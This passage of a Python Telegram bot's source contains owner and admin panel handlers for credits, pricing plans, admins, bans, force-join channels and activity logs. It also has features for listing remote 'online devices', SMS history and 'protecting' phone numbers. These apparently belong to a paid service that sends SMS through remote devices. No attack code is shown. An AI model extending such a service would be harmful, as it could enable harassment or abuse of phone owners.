        f"{em(EMOJI_CHECK, '✅')} {amount} credits added to <code>{uid}</code>\nBalance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:credits:deduct")
async def owner_credits_deduct_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.deduct_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits</b>\n\nUser ID:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_credits_uid)
async def owner_credits_deduct_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        uid = int(msg.text.strip())
        await state.update_data(deduct_uid=uid)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID!", parse_mode="HTML")
        return
    await state.set_state(S.deduct_credits_amount)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💰')} Amount?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_credits_amount)
async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
        if amount < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid!", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    uid = fsmd.get("deduct_uid")
    success = deduct_credits(uid, amount, d)
    save(d)
    await state.clear()
    if success:
        await msg.answer(
            f"{em(EMOJI_CHECK, '✅')} {amount} credits deducted from <code>{uid}</code>",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
    else:
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} Insufficient credits!",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )

@R.callback_query(F.data == "owner:add_all_credits")
async def owner_add_all_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_all_credits_amount)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits to ALL</b>\n\nKitne credits each user ko?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_all_credits_amount)
async def owner_add_all_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
        if amount < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid!", parse_mode="HTML")
        return
    await state.clear()
    users = d.get("users", {})
    count = 0
    for uid_str in users:
        add_credits(int(uid_str), amount, d)
        count += 1
    save(d)
    notification = f"{em(EMOJI_MONEY, '💰')} <b>+{amount} credits added!</b>"
    success = 0
    for uid_str in users:
        try:
            await msg.bot.send_message(int(uid_str), notification, parse_mode="HTML")
            success += 1
            await asyncio.sleep(0.03)
        except: pass
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Added {amount}c to {count} users\nNotified: {success}",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:deduct_all_credits")
async def owner_deduct_all_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.deduct_all_credits_amount)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct from ALL</b>\n\nKitne credits each?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_all_credits_amount)
async def owner_deduct_all_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
        if amount < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid!", parse_mode="HTML")
        return
    await state.clear()
    users = d.get("users", {})
    owners = d.get("owners", [])
    admins = d.get("admins", [])
    count = total = 0
    for uid_str, udata in users.items():
        uid_int = int(uid_str)
        if uid_int in owners or uid_int in admins:
            continue
        cur = udata.get("credits", 0)
        if cur >= amount:
            udata["credits"] = cur - amount
            total += amount
            count += 1
        elif cur > 0:
            total += cur
            udata["credits"] = 0
            count += 1
    save(d)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Deducted from {count} users\nTotal: {total}c",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

# ═══════════════════════════════════════════════════════════════
# ║  PRICING PLANS
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:pricing:menu")
async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plans = d.get("pricing", {}).get("plans", [])
    text = f"{em(EMOJI_MONEY, '💳')} <b>Pricing Plans</b> ({len(plans)})\n\n"
    for i, p in enumerate(plans, 1):
        text += f"{i}. <b>{p['name']}</b> — ₹{p['price']} = {p['credits']}c\n"
    rows = [
        [btn("ᴀᴅᴅ ᴘʟᴀɴ", "owner:pricing:add", EMOJI_CHECK, "➕", style="success")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴘʟᴀɴ", "owner:pricing:remove", EMOJI_CROSS, "🗑", style="danger")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:pricing:add")
async def owner_pricing_add(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_plan_name)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💳')} <b>Plan Name</b>\n\n(e.g. Basic)",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_name)
async def owner_pricing_name(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    await state.update_data(plan_name=msg.text.strip())
    await state.set_state(S.add_plan_price)
    await msg.answer(f"{em(EMOJI_MONEY, '💳')} Price in ₹?", reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]), parse_mode="HTML")

@R.message(S.add_plan_price)
async def owner_pricing_price(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        price = float(msg.text.strip())
        await state.update_data(plan_price=price)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid!", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_credits)
    await msg.answer(f"{em(EMOJI_MONEY, '💳')} Credits count?", reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]), parse_mode="HTML")

@R.message(S.add_plan_credits)
async def owner_pricing_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        await state.update_data(plan_credits=credits)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid!", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_link)
    await msg.answer(f"{em(EMOJI_MONEY, '💳')} Payment link (URL)?", reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]), parse_mode="HTML")

@R.message(S.add_plan_link)
async def owner_pricing_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} URL must start with http!", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    plan = {
        "id": str(int(time.time())),
        "name": fsmd.get("plan_name", "Plan"),
        "price": fsmd.get("plan_price", 0),
        "credits": fsmd.get("plan_credits", 0),
        "currency": "INR",
        "payment_link": link
    }
    d.setdefault("pricing", {}).setdefault("plans", []).append(plan)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Plan added: <b>{plan['name']}</b>",
        reply_markup=kb([(f"{sc('back')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:pricing:remove")
async def owner_pricing_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ No plans!", show_alert=True)
        return
    rows = [[btn(p['name'][:25], f"owner:pricing:del:{p['id']}", EMOJI_CROSS, "🗑", style="danger")] for p in plans]
    rows.append([btn("ʙᴀᴄᴋ", "owner:pricing:menu", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Plan</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:pricing:del:"))
async def owner_pricing_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plan_id = cq.data.split("owner:pricing:del:", 1)[1]
    d["pricing"]["plans"] = [p for p in d.get("pricing", {}).get("plans", []) if p["id"] != plan_id]
    save(d)
    await cq.answer("🗑 Removed!")
    await owner_pricing_menu(cq, state)

# ═══════════════════════════════════════════════════════════════
# ║  OWNERS / ADMINS MANAGEMENT
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:owners:menu")
async def owner_owners_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admins</b> ({len(d.get('owners', []))}/6)",
        reply_markup=owners_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:owners:add")
async def owner_owners_add(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    if len(d.get("owners", [])) >= 6:
        await cq.answer("❌ Max 6!", show_alert=True)
        return
    await state.set_state(S.add_owner)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Add Super Admin</b>\n\nUser ID:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:owners:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_owner)
async def owner_owners_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID!", parse_mode="HTML")
        return
    if is_owner(new_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already super admin!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    if len(d.get("owners", [])) >= 6:
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Max 6!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    d["owners"].append(new_id)
    save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Super admin added: <code>{new_id}</code>", reply_markup=owners_menu_kb(load()), parse_mode="HTML")
    try:
        await msg.bot.send_message(new_id, f"{em(EMOJI_CROWN, '🔱')} You are now Super Admin!", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owner_owners_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    del_id = int(cq.data.split("owner:owners:del:", 1)[1])
    if del_id == MAIN_OWNER or del_id in SUPER_ADMINS:
        await cq.answer("❌ Cannot remove main owner!", show_alert=True)
        return
    if del_id in d["owners"]:
        d["owners"].remove(del_id)
        save(d)
        await cq.answer("🗑 Removed!")
    await owner_owners_menu(cq, state)

@R.callback_query(F.data == "owner:admins:menu")
async def owner_admins_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b> ({len(d.get('admins', []))})",
        reply_markup=admins_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:admins:add")
async def owner_admins_add(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_admin)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Add Admin</b>\n\nUser ID:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:admins:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_admin)
async def owner_admins_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid!", parse_mode="HTML")
        return
    if new_id in d.get("admins", []) or is_owner(new_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already!", reply_markup=admins_menu_kb(d), parse_mode="HTML")
        return
    d["admins"].append(new_id)
    save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Admin added: <code>{new_id}</code>", reply_markup=admins_menu_kb(load()), parse_mode="HTML")
    try:
        await msg.bot.send_message(new_id, f"{em(EMOJI_SHIELD, '🛡')} You are now Admin!", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.startswith("owner:admins:del:"))
async def owner_admins_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    del_id = int(cq.data.split("owner:admins:del:", 1)[1])
    if del_id in d.get("admins", []):
        d["admins"].remove(del_id)
        save(d)
        await cq.answer("🗑 Removed!")
    await owner_admins_menu(cq, state)

# ═══════════════════════════════════════════════════════════════
# ║  BAN / UNBAN
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
async def panel_ban_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.ban_user)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🚫')} <b>Ban User</b>\n\nUser ID:",
        reply_markup=kb([(f"{sc('cancel')}", back)]),
        parse_mode="HTML"
    )

@R.message(S.ban_user)
async def panel_ban_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    try:
        ban_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID!", parse_mode="HTML")
        return
    if is_owner(ban_id, d) or is_admin(ban_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Cannot ban admin/owner!", parse_mode="HTML")
        return
    if ban_id not in d.get("banned", []):
        d.setdefault("banned", []).append(ban_id)
        save(d)
    await state.clear()
    back_kb = owner_kb(d) if is_owner(msg.from_user.id, d) else admin_kb(d)
    await msg.answer(f"{em(EMOJI_CROSS, '🚫')} Banned: <code>{ban_id}</code>", reply_markup=back_kb, parse_mode="HTML")
    try:
        await msg.bot.send_message(ban_id, f"{em(EMOJI_CROSS, '🚫')} You are banned.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
async def panel_unban_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    banned = d.get("banned", [])
    if not banned:
        await cq.answer("✅ No banned users!", show_alert=True)
        return
    prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
    await cq.message.edit_text(
        f"{em(EMOJI_CHECK, '🔓')} <b>Unban</b>\n\nBanned: {len(banned)}",
        reply_markup=unban_menu_kb(d, prefix),
        parse_mode="HTML"
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
async def panel_unban_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    ban_id = int(cq.data.split(":")[-1])
    if ban_id in d.get("banned", []):
        d["banned"].remove(ban_id)
        save(d)
    await cq.answer(f"✅ {ban_id} unbanned!", show_alert=True)
    back_text = owner_panel_text(d) if is_owner(cq.from_user.id, d) else admin_panel_text(d)
    back_kb = owner_kb(d) if is_owner(cq.from_user.id, d) else admin_kb(d)
    await cq.message.edit_text(back_text, reply_markup=back_kb, parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════
# ║  USER LIST / STATS
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
async def panel_users_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    prefix = "owner" if is_owner(uid, d) else "admin"
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    text, markup = users_list_kb(d, prefix, 0)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)$"))
async def panel_users_page(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    parts = cq.data.split(":")
    prefix = parts[0]
    page = int(parts[3])
    text, markup = users_list_kb(d, prefix, page)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data == "owner:stats")
async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.answer("⏳ Fetching...")
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)
    stats = api_stats_text(d)
    dev_lines = [f"\n{em(EMOJI_CHECK, '🟢')} <b>Online ({len(devices)})</b>\n"]
    if not devices:
        dev_lines.append(f"  😴 None online")
    for dv in devices[:20]:
        dev_lines.append(f"  📱 <b>{dv['dev_name'][:20]}</b> — 🔥 {dv['fb_label'][:20]}")
    full = stats + "\n" + "\n".join(dev_lines)
    if len(full) > 4000:
        full = full[:3990] + "\n<i>...truncated</i>"
    await cq.message.edit_text(
        full,
        reply_markup=kb([(f"{sc('refresh')}", "owner:stats"), (f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "admin:stats")
async def admin_stats_cb(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin Only!", show_alert=True)
        return
    await cq.answer("⏳")
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)
    stats = api_stats_text(d)
    dev_lines = [f"\n{em(EMOJI_CHECK, '🟢')} <b>Online ({len(devices)})</b>\n"]
    for dv in devices[:15]:
        dev_lines.append(f"  📱 {dv['dev_name'][:20]} — 🔥 {dv['fb_label'][:20]}")
    full = stats + "\n" + "\n".join(dev_lines)
    if len(full) > 4000:
        full = full[:3990] + "\n<i>...truncated</i>"
    await cq.message.edit_text(full, reply_markup=kb([(f"{sc('refresh')}", "admin:stats"), (f"{sc('back')}", "admin:home")]), parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════
# ║  FORCE JOIN MANAGEMENT
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:fj:menu")
async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    fj = d.get("force_join", {})
    ch = fj.get("channels", [])
    status = "🟢 ON" if fj.get("enabled") else "🔴 OFF"
    text = f"{em(EMOJI_BELL, '🔗')} <b>Force Join</b>\n\nStatus: {status}\nChannels: {len(ch)}\n\n"
    for c in ch:
        text += f"• {c.get('title', '?')} (<code>{c['id']}</code>)\n"
    rows = [
        [btn("ᴀᴅᴅ ᴄʜᴀɴɴᴇʟ", "owner:fj:add", EMOJI_CHECK, "➕", style="success")],
        [btn("ʀᴇᴍᴏᴠᴇ", "owner:fj:remove", EMOJI_CROSS, "🗑", style="danger")],
        [InlineKeyboardButton(text=f"{'🔴 Disable' if fj.get('enabled') else '🟢 Enable'}", callback_data="owner:fj:toggle")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:add")
async def owner_fj_add(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.fj_add_channel)
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '🔗')} <b>Add Force Join</b>\n\nChannel/Group ID (-100...):",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.message(S.fj_add_channel)
async def owner_fj_channel(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        ch_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID!", parse_mode="HTML")
        return
    await state.update_data(fj_ch_id=ch_id)
    await state.set_state(S.fj_add_link)
    await msg.answer(
        f"{em(EMOJI_BELL, '🔗')} Invite link bhejo (https://t.me/...):",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.message(S.fj_add_link)
async def owner_fj_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid URL!", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    ch_id = str(fsmd.get("fj_ch_id"))
    try:
        chat = await msg.bot.get_chat(int(ch_id))
        title = chat.title or "Channel"
    except:
        title = "Channel"
    channels = d.setdefault("force_join", {}).setdefault("channels", [])
    channels = [c for c in channels if str(c["id"]) != ch_id]
    channels.append({"id": ch_id, "link": link, "title": title, "required": True})
    d["force_join"]["channels"] = channels
    save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Added: {title}", reply_markup=kb([(f"{sc('back')}", "owner:fj:menu")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:remove")
async def owner_fj_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    ch = d.get("force_join", {}).get("channels", [])
    if not ch:
        await cq.answer("❌ None!", show_alert=True)
        return
    rows = [[btn(c.get("title", "?")[:25], f"owner:fj:del:{c['id']}", EMOJI_CROSS, "🗑", style="danger")] for c in ch]
    rows.append([btn("ʙᴀᴄᴋ", "owner:fj:menu", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text(f"{em(EMOJI_CROSS, '🗑')} <b>Remove</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:fj:del:"))
async def owner_fj_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    ch_id = cq.data.split("owner:fj:del:", 1)[1]
    d["force_join"]["channels"] = [c for c in d.get("force_join", {}).get("channels", []) if str(c["id"]) != ch_id]
    save(d)
    await cq.answer("🗑 Removed!")
    await owner_fj_menu(cq, state)

@R.callback_query(F.data == "owner:fj:toggle")
async def owner_fj_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    fj = d.setdefault("force_join", {})
    fj["enabled"] = not fj.get("enabled", False)
    save(d)
    await cq.answer(f"Force Join {'ON' if fj['enabled'] else 'OFF'}!", show_alert=True)
    await owner_fj_menu(cq, state)

# ═══════════════════════════════════════════════════════════════
# ║  FREE MODE TOGGLE
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
async def owner_free_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    d["free_mode"] = (cq.data == "owner:free:on")
    save(d)
    await cq.answer(f"{'🟢 Free ON' if d['free_mode'] else '🔴 Approval Required'}", show_alert=True)
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except: pass

# ═══════════════════════════════════════════════════════════════
# ║  HOME / ACTIVITY / HISTORY / PROTECT / TRACK
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except: pass

@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin Only!", show_alert=True)
        return
    try:
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    except: pass

@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
async def user_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML")
        return
    if is_owner(uid, d):
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if not can_use(uid, d):
        await cq.message.edit_text(f"{em(EMOJI_CROSS, '⛔')} Access nahi!", parse_mode="HTML")
        return
    await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "owner:activity")
async def owner_activity(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    logs = d.get("activity_log", [])[-20:]
    if not logs:
        text = f"{em(EMOJI_GEAR, '📜')} <b>Activity</b>\n\n<i>None</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Recent Activity</b>\n"]
        for e in reversed(logs):
            lines.append(f"[{fmt_time(e.get('timestamp', 0))}] <code>{e.get('uid')}</code> — <b>{e.get('action')}</b>")
        text = "\n".join(lines)
    await cq.message.edit_text(text, reply_markup=kb([(f"{sc('refresh')}", "owner:activity"), (f"{sc('back')}", "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:sms_history")
async def owner_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    all_h = d.get("sms_history", {})
    total = sum(len(v) for v in all_h.values())
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📋')} <b>SMS History</b>\n\nTotal Records: <b>{total}</b>",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:protect")
async def owner_protect(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.protect_number)
    await cq.message.edit_text(
        f"{em(EMOJI_LOCK, '🔒')} <b>Protect Number</b>\n\nNumber:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.protect_number)
async def owner_protect_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid!", parse_mode="HTML")
        return
    PROTECTED_NUMBERS[number] = uid
    d["protected_numbers"] = PROTECTED_NUMBERS
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_LOCK, '🔒')} Protected: <code>{number}</code>",
